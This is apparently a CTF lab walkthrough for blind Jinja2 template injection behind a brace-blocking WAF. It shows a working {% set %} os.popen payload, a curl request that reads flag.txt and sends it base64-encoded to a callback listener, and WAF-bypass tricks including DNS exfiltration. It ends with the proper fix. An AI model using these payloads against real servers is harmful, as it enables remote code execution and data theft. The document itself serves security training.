# Lab 02 — Walkthrough & Explanation

> Open only after your attempt.

## 1. The two obstacles

- The WAF strips anything with `{{` or `}}`, so you can't *print* anything.
- The response never changes and errors are swallowed, so there's no timing or
  error oracle. Your **only** feedback channel is an OOB callback.

## 2. The key insight — statement tags

Jinja2 has two tag families:

- `{{ expression }}` — evaluates **and prints**. Blocked here.
- `{% statement %}` — runs logic and prints **nothing**.

For blind exploitation you never needed the printing. `{% set %}` evaluates its
right-hand side for its side effects and discards the value — which is exactly
what you want when the only thing you care about is the command firing:

```jinja
{% set x = cycler.__init__.__globals__.os.popen('<cmd>').read() %}
```

No braces, no output — the command still runs.

## 3. Confirm + exfil in one shot

Because there's no timing oracle, your confirmation *is* the callback. Fire the
OOB exfil directly; if the listener lights up, execution is proven and you have
the flag at the same time:

```bash
curl -s http://127.0.0.1:8000/profile \
  --data-urlencode "bio={% set x = cycler.__init__.__globals__.os.popen('curl -s http://127.0.0.1:9000/pwn?d=\$(cat flag.txt | base64 | tr -d \"\\n\")').read() %}"
```

Listener:

```
[23:33:06] >>> OOB CALLBACK <<<
  GET /pwn?d=ZmxhZ3tmMWx0ZXJlZF9ibDFuZF9zc3RpX3N0YXRlbWVudF90YWdzX2Z0d30K
```

```bash
echo 'ZmxhZ3tmMWx0ZXJlZF9ibDFuZF9zc3RpX3N0YXRlbWVudF90YWdzX2Z0d30K' | base64 -d
# flag{f1ltered_bl1nd_ssti_statement_tags_ftw}
```

## 4. Level up (do this to push toward "insane")

Real WAFs filter more than braces. Re-edit `app.py`'s `BLOCKLIST` and beat each
one — this is the drill that actually separates you in finals:

- **Block `_` or `__`** → reach dunders without typing them:
  `|attr("\x5f\x5fclass\x5f\x5f")`, or build the string with `~` concatenation.
- **Block `os` / `popen`** → use the generic subclass walk to `subprocess.Popen`,
  or `|attr` your way to `__import__`.
- **Block `.` (attribute access)** → `|attr(...)` and `[...]` item access.
- **No outbound HTTP from the box** → switch the exfil to **DNS**: encode the
  flag into a subdomain and read it off `interactsh`.

Each of these is a payload you should be able to *rebuild from the mechanism*,
not recall. That's the finals skill.

## 5. The fix

Same as Lab 01 — a brace blocklist is security theatre. Statement tags, `|attr`,
and item access walk straight around it. The only real fixes are not rendering
user input as template code, or using a sandboxed/logicless engine.
